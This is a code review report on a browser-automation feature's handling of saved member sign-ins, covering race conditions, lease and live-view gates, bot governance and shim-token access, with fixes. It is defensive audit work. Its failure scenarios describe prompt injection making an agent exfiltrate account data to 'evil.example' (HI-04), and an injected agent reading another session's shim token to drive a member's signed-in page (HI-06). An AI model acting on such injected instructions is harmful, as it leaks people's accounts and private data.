# Phase 07.13: Code Review Report

**Reviewed:** 2026-11-25
**Depth:** deep (cross-module: API work-browser ↔ work-session ↔ device hub ↔ daemon manager ↔ browser child)
**Status:** issues_found

## Summary

The structural parts hold up: the migration is additive and correct (composite FKs, `SET NULL ("signin_id")`,
SECURITY DEFINER clean-up triggers scoped to the triggering row's org and member, TRUNCATE revoked), the owner-only
RESTRICTIVE policy on `work_browser_signins` and the audience backstop on `work_browsers` are right, the AADs cannot
collide with the bots' (agent ids are uuids), no storage state reaches a column, log line, audit row, event or Redis,
grants and browser frames only go to devices whose hello carried `browser` (checked both locally and on the
receiving instance), the Device Link binary path is off the JSON chain, there is no TCP listener, and scheme and
metadata refusals are applied at three layers.

The defects are in the **lifetime of a loaded sign-in** and in the **edges of who can reach it**. Two device-side races
leave a member's sign-in loaded in the page after its turn (one of them makes the device tell the API it is unloaded).
Once that happens, nothing else protects it: neither the API nor the device checks the loaded sign-in when someone
takes control, and the live-view gate checks the lease before the sign-in. Separately, the `open` tool lets the agent
leave a signed-in site without the member's approval (the bots' D-13 sticky rule was not carried over), bot turns get
the browser without any of the bots' browser governance, and on a shared device the shim token lets any other session's
agent drive a session whose sign-in is loaded. The API's `work_browsers` row is never reconciled when the device drops
events or restarts, which leaves member-only approvals and private live views in place indefinitely.

## High

### HI-01: `openWithState` parent timeout is shorter than the child's deadline. A timed-out load leaves the member's sign-in open while every layer records it as unloaded

**Files:** `apps/local-runtime/src/browser/child.ts:82-87`, `apps/local-runtime/src/browser/manager.ts:579-586`,
`apps/local-runtime/src/browser/agent/ops.ts:287-292, 1307-1349`, `apps/local-runtime/src/browser/agent/main.ts:154-162`

**Issue:** `callTimeoutMs` gives the launch allowance only to `op === "open"`. `openWithState`, which also launches
Chromium on first use (`opDeadlineMs` in ops.ts gives it `launch + op` = 105 s), gets only `op + 5 s` = 50 s on the
parent side. A cold launch (the first page after an idle close, or after a Gatekeeper or AV scan of the headless shell)
followed by a slow page load exceeds 50 s. The parent then rejects with `timeout`, and `loadSignIn`'s catch runs. Its
comment says "The child closed the context it had opened with the state". The catch then sets `s.origin = null` and
sends `signin_unloaded`, so the API clears `signin_id` / `signin_user_id`. But the child is still running the op: its
`withDeadline` (main.ts) only races the answer and never cancels the work. `openWithState` then finishes
`openSession({ state })` and `goto`, and the signed-in context stays as the session's page. `forgetDeadChild` keeps
the child because it is still `running`.

**Failure scenario:** Member A's turn opens `https://app.example` with a saved sign-in. The load times out at 50 s, and
the page then opens signed in. `s.loaded` is null and `s.memberPage` is null, so the owner check in `run()`
(manager.ts:737-740) does not fire. In the next turn, by B or a bot, `ocw_browser_snapshot` reads A's signed-in page.
On the API side the row no longer names A, so the live view streams that page to every viewer, and `host` approvals go
back to anyone with `work_session.approve`. The sign-in is also never re-sealed.

**Fix:** Use the agent's own deadline for both ops, and treat any failed load as "the state may be in the child":

```ts
// child.ts
import { opDeadlineMs } from "./agent/ops.js";
function callTimeoutMs(op: AgentOp): number {
  return opDeadlineMs(op) + 5_000;
}
// manager.ts loadSignIn catch: never trust that the child dropped it
} catch (err) {
  s.loaded = null;
  await this.closePage(s, "closed", turn.promptId, { reseal: false }); // kills the child: the state leaves memory
  this.event(s, turn.promptId, "signin_unloaded", origin);
  throw err;
}
```

In `main.ts`, when an `openWithState` deadline fires, also close the session (or exit the child).

### HI-02: A turn that ends while `openWithState` runs leaves the sign-in loaded after the member's turn (D-25 / D-32)

**File:** `apps/local-runtime/src/browser/manager.ts:390-396, 565-578`

**Issue:** `onTurnEnded` unloads only `if (s.loaded)`. While `openWithState` is in flight, `s.loaded` is still null.
`loadSignIn` re-checks `s.turn !== turn` only before calling the child. After the child answers, it sets
`s.loaded = {...}` without checking again. A `prompt.completed` that arrives meanwhile therefore leaves the sign-in
loaded with no turn. This happens when a person presses Stop: the SDK or Codex completes the turn while our in-process
or shim tool call keeps running, because `child.call` takes no abort signal.

**Failure scenario:** A stops their turn during a signed-in `open`. The page stays signed in until the 10-minute idle
close or until another asker's *tool call*. The idle close re-seals it. In the meantime the member-only state on the
API is correct, but see HI-03: the next asker can take control of the page without making any tool call.

**Fix:** After `openWithState` returns, check again and unload at once:

```ts
s.loaded = { signinId: answer.signinId, userId: grant.askerId, origin, fingerprint: res.fingerprint };
if (s.turn !== turn || !this.opts.optIn() || s.child !== child) {
  await this.closePage(s, "closed", turn.promptId); // re-seal, close, signin_unloaded
  throw Object.assign(new Error("turn ended"), { code: "not_allowed" });
}
```

### HI-03: Taking control ignores a loaded sign-in, and the live-view gate puts the lease before the sign-in, so another person can watch and type into a member's signed-in page

**Files:** `apps/api/src/modules/work-browser/lease.ts:131-160`, `apps/api/src/modules/work-browser/live.ts:399, 461-493`,
`apps/local-runtime/src/browser/manager.ts:498-504`, `apps/local-runtime/src/browser/takeover.ts:57-67`

**Issue:** Only the asker rule decides who may take the page (`askerOf` = in-flight, else last turn). Nothing checks
`work_browsers.signin_user_id`: not `takeWorkLease`, not `decide().control`, and not the device's `onLease`/`onHeld`
(which only skips `memberPage` when a sign-in is loaded). In `stateOf`, `if (page.leaseId)` comes before
`if (page.signinUserId && ...)`, so the holder always gets `controlling` with frames, even when the page holds another
member's sign-in. The design relies only on "unloaded at the end of each of the member's turns". HI-01, HI-02 and MD-01
show that this does not always happen.

**Failure scenario:** After HI-02 (A stopped a signed-in turn), B queues a prompt. B's prompt is in flight, so B passes
`askerOf`. B clicks "Take control" before the agent makes a browser call. The API grants the lease, the device pauses
the agent and applies B's input, and B's socket receives the frames of A's signed-in page. Every other viewer sees
"Private sign-in in progress".

**Fix:** Defence in depth at both ends:

```ts
// lease.ts takeWorkLease: a page with someone else's sign-in loaded is not takeable
and(eq(workBrowsers.state, "open"),
    or(isNull(workBrowsers.signinUserId), eq(workBrowsers.signinUserId, p.userId)), ...)
// live.ts stateOf: the member sign-in gate first; a lease by someone else on a signed-in page shows nothing
if (page.signinUserId && page.signinUserId !== v.auth.userId) return private(member_session)
```

On the device, in `onHeld`: when `s.loaded && s.loaded.userId !== (s.turn?.grant?.askerId ?? s.lastAskerId)`, call
`closePage(s, "closed", null)` before applying the lease.

### HI-04: `open` to another host leaves a signed-in site without the member's approval (D-26; the bots' D-13 sticky member-data rule is missing)

**File:** `apps/local-runtime/src/browser/manager.ts:774-806, 816-879`

**Issue:** The site lock (`lockedOut` in ops.ts) and `signed_in_host` apply only to navigations caused by `act` on the
locked page. `open` with another origin re-seals and closes the signed-in page (`if (s.loaded && s.loaded.origin !==
target) closePage`) and then opens the new host through the ordinary gate (`needsHost`):

- a loopback target never asks;
- Full access skips the `host` prompt entirely;
- a `host` prompt goes to anyone with `work_session.approve`, because `signin_unloaded` already cleared
  `signin_user_id`, and its summary shows only the origin, never the query.

The bots' Agent Channel keeps member data sticky for the turn. After a signed-in page, an `open` to any other host
needs the requester's yes (`agent-channel/browser.ts:1059-1080`, the WINDOWS #292 lesson that CONTEXT D-32 cites). The
Work Zone does not apply that rule. ADR-0035 §6 says Full access never skips the member's approval on a signed-in
page.

**Failure scenario:** In a Full access turn, injected text on the signed-in page tells the agent to snapshot the account
page and then `ocw_browser_open https://evil.example/?d=<account data>`. The page closes and the new page opens with
no prompt. In a normal turn, the person sees "Open https://evil.example:443" and cannot see the payload.

**Fix:** Keep a per-turn `memberSites: Set<siteKey>` that is set when a sign-in loads and cleared only at turn start.
While it is non-empty, any `open` (or redirect) to an origin outside it asks `signed_in_host` first. That approval is
member-only, is not skipped by Full access, and covers loopback too. This mirrors `crossSiteFor` / `stickyMemberData`.

### HI-05: Bot turns get the Work Zone browser with no browser governance (no `browser.use`, module deny, kill switch or per-bot switch)

**File:** `apps/api/src/modules/work-session/browser-grant.ts:146-166`

**Issue:** `browserGrantFor` makes the resolver decision only for people (`if (!a.askerIsBot) perms.decide(...
"work_session.prompt")`). A bot asker gets `allowed: true` once the org policy and the device opt-in are on. The
integration test asserts exactly that (`browser-grant.int.test.ts:302-304`). The bots' own browser requires
`browser.use` for the agent acting on behalf of the human. That check carries the ADR-0024 module deny rules, per-agent
denies and disabled bots. It also requires the sandbox policy's org switch, the kill switch and the bot's own `browser`
switch (`sandbox/service.ts:140-160`). None of these is consulted here. The sponsor's `work_session.prompt` is not
re-checked either. This breaks principle 6 (explicit deny wins) and the owner's "como los bots".

**Failure scenario:** An admin turns the Browser module off for a department's bots, or flips the browser kill switch.
A bot with a Work Zone profile (ADR-0038) still opens pages on the member's device, and those pages include
`localhost` and LAN hosts with no host approval.

**Fix:** For `askerIsBot`, decide `browser.use` as `{ kind: "agent", agentId, onBehalfOfUserId: onBehalfOf }` on the
agent resource. Require the sandbox policy (enabled, not killed) and the bot's browser switch, for example by reusing
`sandboxAvailable(tx, perms, { agentId, userId: onBehalfOf }, "browser")`. Check `work_session.prompt` for
`onBehalfOf`. Return `refused(a, "no_access")` otherwise, and update the test.

### HI-06: On a shared device, the shim token lets any other session's agent drive a session whose member sign-in is loaded

**Files:** `apps/local-runtime/src/browser/shim-token.ts:1-50`, `apps/local-runtime/src/browser/manager.ts` (`shimCall`),
`apps/local-runtime/src/control-socket.ts:52-67`, `apps/api/src/modules/work-session/browser-grant.ts:107-116`

**Issue:** `browserCall` is authorized only by a token that sits in `<browsersRoot>/run/<sessionId>/shim-token`. That
file is readable by the device's OS user, and so is the control socket. Every Work Zone agent on the device runs as
that user, whichever member's session it serves. `shimCall` hands the call to `s.tools.call`, which attributes it to
the target session's running turn. If that turn is member A's with A's sign-in loaded, the owner check passes. ADR-0035
records that the token "is not a boundary against same-user processes", but the member-facing copy (D-29) and the
D-32 audience rule only cover "the owner of {device}". Shared devices with several members are a supported
configuration: the grant test shares Eli's device with Dana, and sign-ins are allowed there.

**Failure scenario:** Frank's Codex session on Eli's shared device reads a prompt-injected page. Its shell runs
`cat ~/.ocw/browsers/run/*/shim-token` and sends `{"cmd":"browserCall","session":"<Dana's>","token":…,"tool":"snapshot"}`
over the control socket. That call reads Dana's signed-in page during her turn. No `/proc` or ptrace access is needed,
and it also works on macOS.

**Fix:** Authenticate the caller, not just the file. Check the connecting peer (Linux `SO_PEERCRED`, macOS
`LOCAL_PEERPID`) and require it to be a descendant of that session's own app-server pid. Alternatively, keep
`signinAllowed` false on a device where members other than the asker and the owner may run sessions (the device's
grants), and say so in the D-29 copy.

## Medium

### MD-01: `work_browsers` is never reconciled after dropped events, device restarts or a failed load reply, so stale `signin_user_id` and `state='open'` persist

**Files:** `apps/api/src/modules/work-browser/events.ts:117-132, 210-225`, `apps/api/src/modules/work-browser/load.ts:172-179`,
`apps/api/src/modules/device/hub.ts` (`replyOn`), `apps/local-runtime/src/daemon.ts:549-552`

**Issue:** Only these clear `signin_id` / `signin_user_id`: the device's `signin_unloaded` event, a revoke or expiry
(`unlinkGonePages`), and `clearLoaded` when `reply` *throws*. The gaps are:

- `closeRow` (closed / crashed / takeover_abandoned) leaves the sign-in fields untouched;
- the daemon sends `browser.event` only while connected, so a `signin_unloaded` or `closed` sent offline is lost;
- a daemon restart (all children die, run dirs swept) writes nothing about its sessions' pages on hello;
- `hub.replyOn` *returns* `"closed"` / `"too_large"` instead of throwing, so a load answered on a socket that
  closed (link replaced) keeps `recordLoaded` with no device holding the state.

**Failure scenario:** The link drops while A's sign-in is loaded, and the daemon restarts. For the rest of the session,
every browser approval is `{ only: A }` (`browser-grant.ts:269`), so B's own host prompts can only be answered by A.
"Needs you" points at A. Every other viewer sees "Private browsing for A" on public pages. The sidebar shows
`live: true` forever.

**Fix:** Clear `signin_id`, `signin_user_id` and `upload_*` in `closeRow`. Check `replyOn`'s result and call
`clearLoaded` unless it is `"sent"`. On device hello (a new daemon process) and on link close after the offline grace,
close every open `work_browsers` row of the device's sessions in one user-less statement, clearing lease and sign-in
columns, and announce the lease change.

### MD-02: The live-view gate lags a new lease (and a new sign-in load) by one refresh, so other viewers get frames of the page while the holder types

**Files:** `apps/api/src/modules/work-browser/live.ts:437-493, 642-696`, `apps/api/src/modules/work-browser/load.ts:136-158`

**Issue:** `stateOf` / `mayReceive` decide only from the polled `e.view.page`. `onTake` sets `e.lease` but not
`e.view.page.leaseId`, and it sends the holder `lease` (which enables input in the web) *before* `announceLease` and
`refresh(e)` start. Until the refresh completes on this instance, every other viewer still gets `live` frames. Remote
instances wait for a best-effort Redis announce, with the 1 s poll as a backstop. The same applies to a sign-in load:
nothing notifies the live hub, so frames of the just-signed-in page reach the other viewer (the device owner) for up
to `pollMs`.

**Failure scenario:** The holder starts typing a username or a one-time code right after the `lease` frame. Frames
showing it reach the other audience members on the same instance, and on other instances if the announce is lost,
for up to about 1 s.

**Fix:** In `stateOf`, treat a local `e.lease` (even one not yet `seen`) as private for every viewer except
`e.lease.viewer`. Patch `e.view.page` with the taken lease synchronously before sending `lease`. After `recordLoaded`,
publish a lease-style announcement so every instance re-reads at once.

### MD-03: A member who leaves the organization keeps their cookies in a loaded page, and `browser.close { reason: "policy" | "access_lost" }` is never sent

**Files:** `packages/db/drizzle/20261125164903_work_zone_browser/migration.sql` (`work_browser_signins_member_gone`),
`packages/contracts/src/device-link.ts:541-543`, `apps/api/src/modules/work-browser/sweep.ts:44-93`

**Issue:** The member-gone trigger deletes the sign-in rows, and the FK nulls `work_browsers.signin_id`. But no API
path then runs `unlinkGonePages` or sends `browser.close`, so the device keeps the removed member's state loaded until
the turn ends. The `policy` and `access_lost` close reasons in the contract have no sender. The manager's doc comment
claims they close pages on "policy off, access lost".

**Fix:** After membership deactivation or removal, run `unlinkGonePages(loadedPages)` for the org and `closePages`
(revoked), as the revoke route does. Either implement the `policy` / `access_lost` senders (policy switch off, viewer
re-decision) or drop the enum values and the comment.

## Low

### LO-01: The lease row is not refreshed for pointer-only input, so the shared sweep ends an active lease

**File:** `apps/api/src/modules/work-browser/live.ts:721-737`

`onInput` extends only the local `expiresAtMs`. The row is kept fresh only `if (l.inputMarked …)`. A holder who only
moves or scrolls for more than 11 minutes is ended as `idle` by `sweepLapsedLeases` on any instance while still
active. **Fix:** keep the row every `KEEP_EVERY_MS` regardless of `inputMarked`.

### LO-02: Claude `browserDenyReason` trusts a missing `mcp_server`

**File:** `apps/local-runtime/src/claude/claude-runtime.ts:1191-1198`

`server === undefined || server.source === "sdk"` allows a call with no provenance. The file's own rule
(`isSdkServer`) says a missing source is never trusted. The shadow check runs asynchronously after `init`, so a CLI
that omits `mcp_server` cannot tell a project `ocw_browser` from ours. **Fix:** require
`server?.source === "sdk"`, or fall back to `browserShadowed` being known false (the shadow check completed).

### LO-03: `registerLeaseSocket` / `clearLeaseSocket` are production methods used only by tests, and they bypass the DB lease

**File:** `apps/api/src/modules/work-browser/live.ts:125-128, 1092-1110`

They install a local lease holder with no `takeWorkLease` row. This is dead code on a security-relevant interface.
**Fix:** move them behind a test seam, or delete them.

### LO-04: A steered prompt runs inside the signed-in member's turn with that member's grant

**File:** `apps/local-runtime/src/daemon.ts:1730-1738`

With `delivery === "steer"`, the steering person's prompt joins the running turn. `onTurnStarted` never switches the
turn's grant, so the member's loaded sign-in stays in a turn that another person now directs. Only the device owner can
be in such a session (D-32), which is an accepted risk, but this contradicts "loaded only in the member's own turns".
**Fix:** on a steer whose grant names a different asker, unload first (`closePage`) or refuse the steer while a sign-in
is loaded.

### LO-05: The sweep's SQL arguments read as swapped

**File:** `apps/api/src/modules/work-browser/sweep.ts:105-113`

The code passes `[lapsed, at, …]` to `work_browser_sweep_organizations(p_now, p_before, …)`, so `p_now` is
`now - grace`. The behaviour is correct, because leases compare against `p_now` and sign-ins against `p_before`, but
the names say the opposite. **Fix:** rename the parameters (`p_lease_before`, `p_signin_before`) or add a comment.

- **HI-01.** `child.ts` waits `opDeadlineMs(op) + 5 s` for every op. The table lives in `agent/deadline.ts`, so the
  daemon never loads playwright-core at start. When `openWithState` reaches its deadline, the child answers `timeout`
  and then exits (code 4), and Playwright's exit handler ends its Chromium. After any failed or timed-out load, the
  manager closes that child and waits for the process to exit. Only then does it send `signin_unloaded`.
- **HI-02.** The `TurnState` object is the load's token, and it has an explicit `ended` flag. When `openWithState`
  returns after the turn ended, after the opt-in went off, or after the child changed, the manager re-seals the late
  page, closes it and reports it unloaded. That page never becomes `s.loaded`.
- **HI-03 (device).** The lease frame does not name its holder. So while a sign-in is loaded, `onHeld` accepts the lease
  only when the member is the only possible holder: the running (or last) turn is theirs, and so is every prompt the
  device was handed. Otherwise the manager cuts off input at once, then re-seals and closes the page. A load that
  finishes under such a lease is closed too. A `holderUserId` field on `browser.lease` would let the device check the
  holder exactly. That is a contract change, so it is left to the API side.
- **HI-04.** A turn that loaded a sign-in carries `memberData` (the member's sites) until the next turn starts. These
  calls ask the member (`signed_in_host`) first: an `open`, a redirect, or any call except `close` on a page outside
  those sites. This includes loopback, and Full access does not skip it. The summary says whether the address has a
  path or query, but never shows it. **Follow-up for the API:** once the signed-in page has closed, `signin_user_id` is
  null. `browserApproverRule` then returns `{ only: null }` for `signed_in_host`, so these asks can only expire. That
  fails closed, but for usability `signed_in_host` with no loaded sign-in should fall back to the human author of the
  in-flight prompt.
- **HI-06.** Two stronger options were measured, and neither works:
  1. A per-session secret on an inherited descriptor. With Codex 0.172, a socketpair on fd 3 of `codex app-server`
     does not reach its MCP server (writing to fd 3 there gave `ENXIO`; a direct-spawn control run received it).
  2. A check of the connecting peer. Node has no `SO_PEERCRED` / `LOCAL_PEERPID` API.

  So the fallback applies. A session whose shim token was issued (Codex) loads a member's sign-in only while every
  other live session on the device is that member's own private session (`signinAllowed`, a human asker, the same id).
  This covers the running turn, the newest grant and the queued prompts. When another person's session starts, or gets
  a new asker, the sign-in is unloaded at once. `ocw_browser_signin` refuses, and so does the `open` result, and both
  say why. Claude sessions have no token, so their tools are reachable only inside the daemon, and they keep loading.
  **Residual risks:**
  - The device owner's own sessions count as another person's, so a member's Codex sign-in does not load while the
    owner has any live session on that device.
  - Another session's agent can still drive a Codex session's public pages through its token, during that session's
    turn and under its grant. No member data is on those pages.
  - Two same-user paths remain, as ADR-0035 A-5 records: reading the browser's memory (Linux without Yama or with
    `ptrace_scope` 0), and reading the daemon process.
- **LO-02.** Claude allows `mcp__ocw_browser__*` only when the SDK names `{ name: "ocw_browser", source: "sdk" }`.
  When `mcp_server` is missing, both `canUseTool` and `PreToolUse` deny the call.
- **LO-04.** The daemon marks steers (`onPrompt(..., { steer })`). A steer that joins the running turn keeps the turn's
  member data. When the steer is by anyone else (or a bot), the manager re-seals and closes the member's signed-in
  page, or the page they signed in to by hand, at once. No sign-in loads in the rest of that mixed turn.
